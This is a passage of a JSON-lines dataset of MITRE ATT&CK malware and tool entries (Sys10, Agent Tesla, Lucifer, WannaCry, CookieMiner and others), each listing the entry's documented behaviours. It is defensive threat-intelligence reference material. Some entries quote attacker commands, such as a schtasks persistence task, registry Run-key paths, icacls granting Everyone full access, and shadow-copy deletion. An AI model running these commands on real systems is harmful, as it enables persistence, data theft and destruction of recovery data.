previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity."], "is_subtechnique": false}
{"text": " [Sys10](https://attack.mitre.org/software/S0060) is a backdoor that was used throughout 2013 by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)", "idx": "https://attack.mitre.org/software/S0060", "title": "Sys10", "entity": "Sys10", "entity_type": "software", "entity_context": ["Sys10 collects the local IP address of the victim and sends it to the C2.", "Sys10 collects the computer name, OS versioning information, and OS install date and sends the information to the C2.", "Sys10 collects the group name of the logged-in user and sends it to the C2.", "Sys10 uses HTTP for C2.", "Sys10 uses an XOR 0x1 loop to encrypt its C2 domain.", "Sys10 collects the account name of the logged-in user and sends it to the C2."], "is_subtechnique": false}
{"text": " [Mis-Type](https://attack.mitre.org/software/S0084) is a backdoor hybrid that was used by [Dust Storm](https://attack.mitre.org/groups/G0031) in 2012. (Citation: Cylance Dust Storm)", "idx": "https://attack.mitre.org/software/S0084", "title": "Mis-Type", "entity": "Mis-Type", "entity_type": "software", "entity_context": ["Mis-Type may create a temporary user on the system named “Lost_{Unique Identifier}.”", "Mis-Type uses cmd.exe to run commands for enumerating the host.", "Mis-Type first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.", "Mis-Type network traffic can communicate over HTTP.", "Mis-Type may create a file containing the results of the command <code>cmd.exe /c net user {Username}</code>.", "Mis-Type saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.", "Mis-Type uses Base64 encoding for C2 traffic.", "Mis-Type communicates over common ports such as TCP 80, 443, and 25.", "The initial beacon packet for Mis-Type contains the operating system version and file system of the victim.", "Mis-Type runs tests to determine the privilege level of the compromised user.", "Mis-Type may create a file containing the results of the command <code>cmd.exe /c ipconfig /all</code>.", "Mis-Type network traffic can communicate over a raw socket."], "is_subtechnique": false}
{"text": " [RGDoor](https://attack.mitre.org/software/S0258) is a malicious Internet Information Services (IIS) backdoor developed in the C++ language. [RGDoor](https://attack.mitre.org/software/S0258) has been seen deployed on webservers belonging to the Middle East government organizations. [RGDoor](https://attack.mitre.org/software/S0258) provides backdoor access to compromised IIS servers. (Citation: Unit 42 RGDoor Jan 2018)", "idx": "https://attack.mitre.org/software/S0258", "title": "RGDoor", "entity": "RGDoor", "entity_type": "software", "entity_context": ["RGDoor decodes Base64 strings and decrypts strings using a custom XOR algorithm.", "RGDoor encrypts files with XOR before sending them back to the C2 server.", "RGDoor uploads and downloads files to and from the victim’s machine.", "RGDoor executes the <code>whoami</code> on the victim’s machine.", "RGDoor establishes persistence on webservers as an IIS module.", "RGDoor uses cmd.exe to execute commands on the victim’s machine.", "RGDoor uses HTTP for C2 communications."], "is_subtechnique": false}
{"text": " [Hi-Zor](https://attack.mitre.org/software/S0087) is a remote access tool (RAT) that has characteristics similar to [Sakula](https://attack.mitre.org/software/S0074). It was used in a campaign named INOCNATION. (Citation: Fidelis Hi-Zor)", "idx": "https://attack.mitre.org/software/S0087", "title": "Hi-Zor", "entity": "Hi-Zor", "entity_type": "software", "entity_context": ["Hi-Zor has the ability to create a reverse shell.", "Hi-Zor has the ability to upload and download files from its C2 server.", "Hi-Zor uses various XOR techniques to obfuscate its components.", "Hi-Zor deletes its RAT installer file as it executes its DLL payload file.", "Hi-Zor communicates with its C2 server over HTTPS.", "Hi-Zor communicates with its C2 server over port 443.", "Hi-Zor encrypts C2 traffic with a double XOR using two distinct single-byte keys.", "Hi-Zor creates a Registry Run key to establish persistence.", "Hi-Zor executes using regsvr32.exe called from the Registry Run Keys / Startup Folder persistence mechanism.", "Hi-Zor encrypts C2 traffic with TLS."], "is_subtechnique": false}
{"text": " [EvilGrab](https://attack.mitre.org/software/S0152) is a malware family with common reconnaissance capabilities. It has been deployed by [menuPass](https://attack.mitre.org/groups/G0045) via malicious Microsoft Office documents as part of spearphishing campaigns. (Citation: PWC Cloud Hopper Technical Annex April 2017)", "idx": "https://attack.mitre.org/software/S0152", "title": "EvilGrab", "entity": "EvilGrab", "entity_type": "software", "entity_context": ["EvilGrab has the capability to capture keystrokes.", "EvilGrab has the capability to capture video from a victim machine.", "EvilGrab adds a Registry Run key for ctfmon.exe to establish persistence.", "EvilGrab has the capability to capture screenshots.", "EvilGrab uses port 8080 for C2.", "EvilGrab has the capability to capture audio from a victim machine."], "is_subtechnique": false}
{"text": " [FALLCHILL](https://attack.mitre.org/software/S0181) is a RAT that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least 2016 to target the aerospace, telecommunications, and finance industries. It is usually dropped by other [Lazarus Group](https://attack.mitre.org/groups/G0032) malware or delivered when a victim unknowingly visits a compromised website. (Citation: US-CERT FALLCHILL Nov 2017)", "idx": "https://attack.mitre.org/software/S0181", "title": "FALLCHILL", "entity": "FALLCHILL", "entity_type": "software", "entity_context": ["FALLCHILL uses fake Transport Layer Security (TLS) to communicate with its C2 server.", "FALLCHILL can modify file or directory timestamps.", "FALLCHILL encrypts C2 data with RC4 encryption.", "FALLCHILL can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.", "FALLCHILL has been installed as a Windows service.", "FALLCHILL can delete malware and associated artifacts from the victim.", "FALLCHILL collects MAC address and local IP address information from the victim.", "FALLCHILL can search files on a victim."], "is_subtechnique": false}
{"text": " [LOWBALL](https://attack.mitre.org/software/S0042) is malware used by [admin@338](https://attack.mitre.org/groups/G0018). It was used in August 2015 in email messages targeting Hong Kong-based media organizations. (Citation: FireEye admin@338)", "idx": "https://attack.mitre.org/software/S0042", "title": "LOWBALL", "entity": "LOWBALL", "entity_type": "software", "entity_context": ["LOWBALL uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware.", "LOWBALL command and control occurs via HTTPS over port 443.", "LOWBALL uses the Dropbox cloud storage service for command and control."], "is_subtechnique": false}
{"text": " [Catchamas](https://attack.mitre.org/software/S0261) is a Windows Trojan that steals information from compromised systems. (Citation: Symantec Catchamas April 2018)", "idx": "https://attack.mitre.org/software/S0261", "title": "Catchamas", "entity": "Catchamas", "entity_type": "software", "entity_context": ["Catchamas adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.", "Catchamas captures screenshots based on specific keywords in the window’s title.", "Catchamas creates three Registry keys to establish persistence by adding a Windows Service.", "Catchamas gathers the Mac address, IP address, and the network adapter information from the victim’s machine.", "Catchamas obtains application windows titles and then determines which windows to perform Screen Capture on.", "Catchamas collects keystrokes from the victim’s machine.", "Catchamas steals data stored in the clipboard.", "Catchamas adds a new service named NetAdapter to establish persistence.", "Catchamas stores the gathered data from the machine in .db files and .bmp files under four separate locations."], "is_subtechnique": false}
{"text": " [VBShower](https://attack.mitre.org/software/S0442) is a backdoor that has been used by [Inception](https://attack.mitre.org/groups/G0100) since at least 2019. [VBShower](https://attack.mitre.org/software/S0442) has been used as a downloader for second stage payloads, including [PowerShower](https://attack.mitre.org/software/S0441).(Citation: Kaspersky Cloud Atlas August 2019)", "idx": "https://attack.mitre.org/software/S0442", "title": "VBShower", "entity": "VBShower", "entity_type": "software", "entity_context": ["VBShower has the ability to download VBS files to the target computer.", "VBShower has attempted to obtain a VBS script from command and control (C2) nodes over HTTP.", "VBShower used <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\\a-f0-9A-F{8}</code> to maintain persistence.", "VBShower has the ability to execute VBScript files.", "VBShower has attempted to complicate forensic analysis by deleting all the files contained in <code>%APPDATA%\\..\\Local\\Temporary Internet Files\\Content.Word</code> and <code>%APPDATA%\\..\\Local Settings\\Temporary Internet Files\\Content.Word\\</code>."], "is_subtechnique": false}
{"text": " [schtasks](https://attack.mitre.org/software/S0111) is used to schedule execution of programs or scripts on a Windows system to run at a specific date and time. (Citation: TechNet Schtasks)", "idx": "https://attack.mitre.org/software/S0111", "title": "schtasks", "entity": "schtasks", "entity_type": "software", "entity_context": ["schtasks is used to schedule tasks on a Windows system to run at a specific date and time."], "is_subtechnique": false}
{"text": " [BLUELIGHT](https://attack.mitre.org/software/S0657) is a remote access Trojan used by [APT37](https://attack.mitre.org/groups/G0067) that was first observed in early 2021.(Citation: Volexity InkySquid BLUELIGHT August 2021)", "idx": "https://attack.mitre.org/software/S0657", "title": "BLUELIGHT", "entity": "BLUELIGHT", "entity_type": "software", "entity_context": ["BLUELIGHT can collect process filenames and SID authority level.", "BLUELIGHT can collect the username on a compromised host.", "BLUELIGHT can collect IP information from the victim’s machine.", "BLUELIGHT can download additional files onto the host. ", "BLUELIGHT can uninstall itself.", "BLUELIGHT has captured a screenshot of the display every 30 seconds for the first 5 minutes after initiating a C2 loop, and then once every five minutes thereafter.", "BLUELIGHT has collected the computer name and OS version from victim machines.", "BLUELIGHT can zip files before exfiltration.", "BLUELIGHT has exfiltrated data over its C2 channel.", "BLUELIGHT can collect passwords stored in web browers, including Internet Explorer, Edge, Chrome, and Naver Whale.", "BLUELIGHT can use HTTP/S for C2 using the Microsoft Graph API. ", "BLUELIGHT can enumerate files and collect associated metadata.", "BLUELIGHT can collect the local time on a compromised host.", "BLUELIGHT can collect a list of anti-virus products installed on a machine.", "BLUELIGHT has encoded data into a binary blob using XOR.", "BLUELIGHT can harvest cookies from Internet Explorer, Edge, Chrome, and Naver Whale browsers.", "BLUELIGHT can check to see if the infected machine has VM tools running.", "BLUELIGHT can use different cloud providers for its C2.", "BLUELIGHT has a XOR-encoded payload."], "is_subtechnique": false}
{"text": " [BadPatch](https://attack.mitre.org/software/S0337) is a Windows Trojan that was used in a Gaza Hackers-linked campaign.(Citation: Unit 42 BadPatch Oct 2017)", "idx": "https://attack.mitre.org/software/S0337", "title": "BadPatch", "entity": "BadPatch", "entity_type": "software", "entity_context": ["BadPatch stores collected data in log files before exfiltration.", "BadPatch uses port 26 for C2 communications.", "BadPatch collects files from the local system that have the following extensions, then prepares them for exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .zip, .doc, .docx.", "BadPatch collects the OS system, OS version, MAC address, and the computer name from the victim’s machine.", "BadPatch attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard information. ", "BadPatch has a keylogging capability.", "BadPatch uses HTTP for C2.", "BadPatch captures screenshots in .jpg format and then exfiltrates them.", "BadPatch searches for files with specific file extensions.", "BadPatch establishes a foothold by adding a link to the malware executable in the startup folder.", "BadPatch uses SMTP for C2.", "BadPatch can download and execute or update malware.", "BadPatch uses WMI to enumerate installed security products in the victim’s environment."], "is_subtechnique": false}
{"text": " [GreyEnergy](https://attack.mitre.org/software/S0342) is a backdoor written in C and compiled in Visual Studio. [GreyEnergy](https://attack.mitre.org/software/S0342) shares similarities with the [BlackEnergy](https://attack.mitre.org/software/S0089) malware and is thought to be the successor of it.(Citation: ESET GreyEnergy Oct 2018)", "idx": "https://attack.mitre.org/software/S0342", "title": "GreyEnergy", "entity": "GreyEnergy", "entity_type": "software", "entity_context": ["GreyEnergy can securely delete a file by hooking into the DeleteFileA and DeleteFileW functions in the Windows API.", "GreyEnergy has a module for Mimikatz to collect Windows credentials from the victim’s machine.", "GreyEnergy uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).", "GreyEnergy digitally signs the malware with a code-signing certificate.", "GreyEnergy encrypts communications using AES256.", "GreyEnergy chooses a service, drops a DLL file, and writes it to that serviceDLL Registry key.", "GreyEnergy uses HTTP and HTTPS for C2 communications.", "GreyEnergy has a module to harvest pressed keystrokes.", "GreyEnergy enumerates all Windows services.", "GreyEnergy modifies conditions in the Registry and adds keys.", "GreyEnergy has a module to inject a PE binary into a remote process.", "GreyEnergy has used Tor relays for Command and Control servers.", "GreyEnergy is packed for obfuscation.", "GreyEnergy can download additional modules and payloads.", "GreyEnergy encrypts its configuration files with AES-256 and also encrypts its strings.", "GreyEnergy encrypts communications using RSA-2048.", "GreyEnergy uses cmd.exe to execute itself in-memory."], "is_subtechnique": false}
{"text": " [spwebmember](https://attack.mitre.org/software/S0227) is a Microsoft SharePoint enumeration and data dumping tool written in .NET. (Citation: NCC Group APT15 Alive and Strong)", "idx": "https://attack.mitre.org/software/S0227", "title": "spwebmember", "entity": "spwebmember", "entity_type": "software", "entity_context": ["spwebmember is used to enumerate and dump information from Microsoft SharePoint."], "is_subtechnique": false}
{"text": " [CozyCar](https://attack.mitre.org/software/S0046) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. It is a modular malware platform, and its backdoor component can be instructed to download and execute a variety of modules with different functionality. (Citation: F-Secure The Dukes)", "idx": "https://attack.mitre.org/software/S0046", "title": "CozyCar", "entity": "CozyCar", "entity_type": "software", "entity_context": ["One persistence mechanism used by CozyCar is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: <br><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> <br><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> <br><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code> <br><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>", "CozyCar has executed Mimikatz to harvest stored credentials from the victim and further victim penetration.", "Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.", "Password stealer and NTLM stealer modules in CozyCar harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication.", "One persistence mechanism used by CozyCar is to register itself as a scheduled task.", "The CozyCar dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.", "A module in CozyCar allows arbitrary commands to be executed by invoking <code>C:\\Windows\\System32\\cmd.exe</code>.", "CozyCar uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.", "The payload of CozyCar is encrypted with simple XOR with a rotating key. The CozyCar configuration file has been encrypted with RC4 keys.", "CozyCar's main method of communicating with its C2 servers is using HTTP or HTTPS.", "The CozyCar dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main CozyCar component.", "The main CozyCar dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit.", "One persistence mechanism used by CozyCar is to register itself as a Windows service.", "A system info module in CozyCar gathers information on the victim host’s configuration."], "is_subtechnique": false}
{"text": " [BoxCaon](https://attack.mitre.org/software/S0651) is a Windows backdoor that was used by [IndigoZebra](https://attack.mitre.org/groups/G0136) in a 2021 spearphishing campaign against Afghan government officials. [BoxCaon](https://attack.mitre.org/software/S0651)'s name stems from similarities shared with the malware family [xCaon](https://attack.mitre.org/software/S0653).(Citation: Checkpoint IndigoZebra July 2021)", "idx": "https://attack.mitre.org/software/S0651", "title": "BoxCaon", "entity": "BoxCaon", "entity_type": "software", "entity_context": ["BoxCaon has used DropBox for C2 communications. ", "BoxCaon can execute arbitrary commands and utilize the \"ComSpec\" environment variable.", "BoxCaon has used Windows API calls to obtain information about the compromised host.", "BoxCaon has created a working folder for collected files that it sends to the C2 server. ", "BoxCaon established persistence by setting the <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load</code> registry key to point to its executable.", "BoxCaon has searched for files on the system, such as documents located in the desktop folder.", "BoxCaon can collect the victim's MAC address by using the <code>GetAdaptersInfo</code> API.", "BoxCaon can upload files from a compromised host.", "BoxCaon has the capability to download folders' contents on the system and upload the results back to its Dropbox drive.", "BoxCaon can download files.", "BoxCaon used the \"StackStrings\" obfuscation technique to hide malicious functionalities.", "BoxCaon uploads files and data from a compromised host over the existing C2 channel."], "is_subtechnique": false}
{"text": " [StoneDrill](https://attack.mitre.org/software/S0380) is wiper malware discovered in destructive campaigns against both Middle Eastern and European targets in association with [APT33](https://attack.mitre.org/groups/G0064).(Citation: FireEye APT33 Sept 2017)(Citation: Kaspersky StoneDrill 2017)", "idx": "https://attack.mitre.org/software/S0380", "title": "StoneDrill", "entity": "StoneDrill", "entity_type": "software", "entity_context": ["StoneDrill has been observed deleting the temporary files once they fulfill their task.\t", "StoneDrill can take screenshots.\t", "StoneDrill can check for antivirus and antimalware programs.\t", "StoneDrill has obfuscated its module with an alphabet-based table or XOR encryption.", "StoneDrill can wipe the master boot record of an infected computer.", "StoneDrill has several VBS scripts used throughout the malware's lifecycle.\t", "StoneDrill has relied on injecting its payload directly into the process memory of the victim's preferred browser.", "StoneDrill has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.\t", "StoneDrill has used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes.\t", "StoneDrill has looked in the registry to find the default browser path.", "StoneDrill can obtain the current date and time of the victim machine.\t", "StoneDrill has used the WMI command-line (WMIC) utility to run tasks.", "StoneDrill can wipe the accessible physical or logical drives of the infected machine.\t", "StoneDrill has the capability to discover the system OS, Windows version, architecture and environment.\t", "StoneDrill has a disk wiper module that targets files other than those in the Windows directory."], "is_subtechnique": false}
{"text": " [UPPERCUT](https://attack.mitre.org/software/S0275) is a backdoor that has been used by [menuPass](https://attack.mitre.org/groups/G0045). (Citation: FireEye APT10 Sept 2018)", "idx": "https://attack.mitre.org/software/S0275", "title": "UPPERCUT", "entity": "UPPERCUT", "entity_type": "software", "entity_context": ["UPPERCUT has used HTTP for C2, including sending error codes in Cookie headers.", "UPPERCUT has the capability to obtain the time zone information and current timestamp of the victim’s machine.", "UPPERCUT uses cmd.exe to execute commands on the victim’s machine.", "UPPERCUT has the capability to collect the current logged on user’s username from a machine.", "UPPERCUT has the capability to gather the victim's current directory.", "UPPERCUT has the capability to gather the victim's proxy information.", "UPPERCUT has the capability to gather the system’s hostname and OS version.", "UPPERCUT can download and upload files to and from the victim’s machine.", "UPPERCUT can capture desktop screenshots in the PNG format and send them to the C2 server.", "Some versions of UPPERCUT have used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address."], "is_subtechnique": false}
{"text": " [Lucifer](https://attack.mitre.org/software/S0532) is a crypto miner and DDoS hybrid malware that leverages well-known exploits to spread laterally on Windows platforms.(Citation: Unit 42 Lucifer June 2020)", "idx": "https://attack.mitre.org/software/S0532", "title": "Lucifer", "entity": "Lucifer", "entity_type": "software", "entity_context": ["Lucifer can decrypt its C2 address upon execution.", "Lucifer has established persistence by creating the following scheduled task <code>schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F</code>.", "Lucifer can use certutil for propagation on Windows hosts within intranets.", "Lucifer can check for existing stratum cryptomining information in <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr – %stratum info%</code>.", "Lucifer can collect the IP address of a compromised host.", "Lucifer can collect the computer name, system architecture, default language, and processor frequency of a compromised host.", "Lucifer can clear and remove event logs.", "Lucifer can infect victims by brute forcing SMB.", "Lucifer can scan for open ports including TCP ports 135 and 1433.", "Lucifer has attempted to brute force TCP ports 135 (RPC) and 1433 (MSSQL) with the default username or list of usernames and    passwords.", "Lucifer can exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144).", "Lucifer can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected.", "Lucifer can execute TCP, UDP,  and HTTP denial of service (DoS) attacks.", "Lucifer can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.", "Lucifer can persist by setting Registry key values <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic</code> and <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic</code>.", "Lucifer can identify the process that owns remote connections.", "Lucifer can issue shell commands to download and execute additional payloads.", "Lucifer has used UPX packed binaries.", "Lucifer can identify the IP and port numbers for all remote connections from the compromised host.", "Lucifer has the ability to identify the username on a compromised host.", "Lucifer can use system resources to mine cryptocurrency, dropping XMRig to mine Monero.", "Lucifer can download and execute a replica of itself using certutil.", "Lucifer can use WMI to log into remote machines for propagation.", "Lucifer can use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server."], "is_subtechnique": false}
{"text": " [build_downer](https://attack.mitre.org/software/S0471) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)", "idx": "https://attack.mitre.org/software/S0471", "title": "build_downer", "entity": "build_downer", "entity_type": "software", "entity_context": ["build_downer has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.", "build_downer has added itself to the Registry Run key as \"NVIDIA\" to appear legitimate.", "build_downer has the ability to use the <code>WinExec</code> API to execute malware on a compromised host.", "build_downer has the ability to send system volume information to C2.", "build_downer has the ability to add itself to the Registry Run key for persistence.", "build_downer can extract malware from a downloaded JPEG.", "build_downer has the ability to download files from C2 to the infected host.", "build_downer has the ability to detect if the infected host is running an anti-virus process."], "is_subtechnique": false}
{"text": " [Agent Tesla](https://attack.mitre.org/software/S0331) is a spyware Trojan written for the .NET framework that has been observed since at least 2014.(Citation: Fortinet Agent Tesla April 2018)(Citation: Bitdefender Agent Tesla April 2020)(Citation: Malwarebytes Agent Tesla April 2020)", "idx": "https://attack.mitre.org/software/S0331", "title": "Agent Tesla", "entity": "Agent Tesla", "entity_type": "software", "entity_context": ["Agent Tesla can steal data from the victim’s clipboard.", "Agent Tesla can collect the timestamp from the victim’s machine.", "Agent Tesla can collect account information from the victim’s machine.", "Agent Tesla has the ability to extract credentials from configuration or support files. ", "Agent Tesla can add itself to the Registry as a startup program to establish persistence. ", "Agent Tesla has routines for exfiltration over SMTP, FTP, and HTTP.", "Agent Tesla has used HTTP for C2 communications.", "Agent Tesla has used <code>ProcessWindowStyle.Hidden</code> to hide windows.", "Agent Tesla can achieve persistence by modifying Registry key entries. ", "Agent Tesla has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.", "Agent Tesla can download additional files for execution on the victim’s machine.", "Agent Tesla has exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery. ", "Agent Tesla has had its code obfuscated in an apparent attempt to make analysis difficult. Agent Tesla has used the Rijndael symmetric encryption algorithm to encrypt strings.", "The primary delivered mechaism for Agent Tesla is through email phishing messages. ", "Agent Tesla has used SMTP for C2 communications.", " Agent Tesla has he ability to perform anti-sandboxing and anti-virtualization checks.", "Agent Tesla has been executed through malicious e-mail attachments ", "Agent Tesla can collect the username from the victim’s machine.", "Agent Tesla can capture screenshots of the victim’s desktop.", "Agent Tesla can collect the system's computer name and also has the capability to collect information on the processor, memory, OS, and video card from the system.", "Agent Tesla can gather credentials from a number of browsers. ", "Agent Tesla has the capability to kill any running analysis processes and AV software.", "Agent Tesla has the ability to steal credentials from FTP clients and wireless profiles.", "Agent Tesla has the ability to use form-grabbing to extract data from web data forms.", "Agent Tesla has created hidden folders.", "Agent Tesla can access the victim’s webcam and record video.", "Agent Tesla  has achieved persistence via scheduled tasks. ", "Agent Tesla can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings. ", "Agent Tesla has used wmi queries to gather information from the system. ", "Agent Tesla can encrypt data with 3DES before sending it over to a C2 server.", "Agent Tesla has dropped RegAsm.exe onto systems for performing malicious activity. ", "Agent Tesla has the ability to extract credentials from the Registry. ", "Agent Tesla can inject into known, vulnerable binaries on targeted hosts. ", "Agent Tesla can log keystrokes on the victim’s machine.", "Agent Tesla can list the current running processes on the system.", "Agent Tesla has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code. "], "is_subtechnique": false}
{"text": " [Zeroaccess](https://attack.mitre.org/software/S0027) is a kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that attempts to add victims to the ZeroAccess botnet, often for monetary gain. (Citation: Sophos ZeroAccess)", "idx": "https://attack.mitre.org/software/S0027", "title": "Zeroaccess", "entity": "Zeroaccess", "entity_type": "software", "entity_context": ["Some variants of the Zeroaccess Trojan have been known to store data in Extended Attributes.", "Zeroaccess is a kernel-mode rootkit."], "is_subtechnique": false}
{"text": " [POSHSPY](https://attack.mitre.org/software/S0150) is a backdoor that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2015. It appears to be used as a secondary backdoor used if the actors lost access to their primary backdoors. (Citation: FireEye POSHSPY April 2017)", "idx": "https://attack.mitre.org/software/S0150", "title": "POSHSPY", "entity": "POSHSPY", "entity_type": "software", "entity_context": ["POSHSPY downloads and executes additional PowerShell code and Windows binaries.", "POSHSPY uses PowerShell to execute various commands, one to execute its payload.", "POSHSPY modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.", "POSHSPY uses a WMI event subscription to establish persistence.", "POSHSPY encrypts C2 traffic with AES and RSA.", "POSHSPY appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.", "POSHSPY uses a DGA to derive command and control URLs from a word list.", "POSHSPY uploads data in 2048-byte chunks."], "is_subtechnique": false}
{"text": " [BITSAdmin](https://attack.mitre.org/software/S0190) is a command line tool used to create and manage [BITS Jobs](https://attack.mitre.org/techniques/T1197). (Citation: Microsoft BITSAdmin)", "idx": "https://attack.mitre.org/software/S0190", "title": "BITSAdmin", "entity": "BITSAdmin", "entity_type": "software", "entity_context": ["BITSAdmin can be used to create BITS Jobs to upload and/or download files from SMB file servers.", "BITSAdmin can be used to create BITS Jobs to launch a malicious process.", "BITSAdmin can be used to create BITS Jobs to upload and/or download files.", "BITSAdmin can be used to create BITS Jobs to upload files from a compromised host."], "is_subtechnique": false}
{"text": " This piece of malware steals the content of the user's keychain while maintaining a permanent backdoor (Citation: OSX Keydnap malware).", "idx": "https://attack.mitre.org/software/S0276", "title": "Keydnap", "entity": "Keydnap", "entity_type": "software", "entity_context": ["Keydnap uses a copy of tor2web proxy for HTTPS communications.", "Keydnap uses the keychaindump project to read securityd memory.", "Keydnap puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.", "Keydnap prompts the users for credentials.", "Keydnap uses HTTPS for command and control.", "Keydnap uses Python for scripting to execute additional commands.", "Keydnap adds the setuid flag to a binary so it can easily elevate in the future.", "Keydnap uses a resource fork to present a macOS JPEG or text file icon rather than the executable's icon assigned by the operating system.", "Keydnap uses a Launch Agent to persist."], "is_subtechnique": false}
{"text": " [CookieMiner](https://attack.mitre.org/software/S0492) is mac-based malware that targets information associated with cryptocurrency exchanges as well as enabling cryptocurrency mining on the victim system itself. It was first discovered in the wild in 2019.(Citation: Unit42 CookieMiner Jan 2019)", "idx": "https://attack.mitre.org/software/S0492", "title": "CookieMiner", "entity": "CookieMiner", "entity_type": "software", "entity_context": ["CookieMiner has loaded coinmining software onto systems to mine for Koto cryptocurrency. ", "CookieMiner has used python scripts on the user’s system, as well as the Python variant of the Empire agent, EmPyre.", "CookieMiner has used the <code>curl --upload-file</code> command to exfiltrate data over HTTP.", "CookieMiner has checked for the presence of \"Little Snitch\", macOS network monitoring and application firewall software, stopping and exiting if it is found.", "CookieMiner can steal Google Chrome and Apple Safari browser cookies from the victim’s machine. ", "CookieMiner can download additional scripts from a web server.", "CookieMiner has used Google Chrome's decryption and extraction operations.", "CookieMiner has installed multiple new Launch Agents in order to maintain persistence for cryptocurrency mining software.", "CookieMiner can steal saved usernames and passwords in Chrome as well as credit card credentials.", "CookieMiner has used base64 encoding to obfuscate scripts on the system. ", "CookieMiner has used a Unix shell script to run a series of commands targeting macOS.", "CookieMiner has retrieved iPhone text messages from iTunes phone backup files.", "CookieMiner has looked for files in the user's home directory with \"wallet\" in their name using <code>find</code>."], "is_subtechnique": false}
{"text": " [WannaCry](https://attack.mitre.org/software/S0366) is ransomware that was first seen in a global attack during May 2017, which affected more than 150 countries. It contains worm-like features to spread itself across a computer network using the SMBv1 exploit EternalBlue.(Citation: LogRhythm WannaCry)(Citation: US-CERT WannaCry 2017)(Citation: Washington Post WannaCry 2017)(Citation: FireEye WannaCry 2017)", "idx": "https://attack.mitre.org/software/S0366", "title": "WannaCry", "entity": "WannaCry", "entity_type": "software", "entity_context": ["WannaCry uses <code>attrib +h</code> and <code>icacls . /grant Everyone:F /T /C /Q</code> to make some of its files hidden and grant all users full access controls.", "WannaCry enumerates current remote desktop sessions and tries to execute the malware on each session.", "WannaCry creates the service \"mssecsvc2.0\" with the display name \"Microsoft Security Center (2.0) Service.\"", "WannaCry scans its local network segment for remote systems to try to exploit and copy itself to.", "WannaCry uses an exploit in SMBv1 to spread itself to other remote systems on a network.", "WannaCry attempts to kill processes associated with Exchange, Microsoft SQL Server, and MySQL to make it possible to encrypt their data stores.", "WannaCry uses Tor for command and control traffic and routes a custom cryptographic protocol over the Tor circuit.", "WannaCry will attempt to determine the local network segment it is a part of.", "WannaCry uses <code>vssadmin</code>, <code>wbadmin</code>, <code>bcdedit</code>, and <code>wmic</code> to delete and disable operating system recovery features.", "WannaCry encrypts user files and demands that a ransom be paid in Bitcoin to decrypt those files.", "WannaCry searches for variety of user files by file extension before encrypting them using RSA and AES, including Office, PDF, image, audio, video, source code, archive/compression format, and key and certificate files.", "WannaCry uses <code>attrib +h</code> to make some of its files hidden.", "WannaCry attempts to copy itself to remote computers after gaining access via an SMB exploit.", "WannaCry contains a thread that will attempt to scan for new attached drives every few seconds. If one is identified, it will encrypt the files on the attached device.", "WannaCry uses Tor for command and control traffic.", "WannaCry utilizes <code>wmic</code> to delete shadow copies."], "is_subtechnique": false}
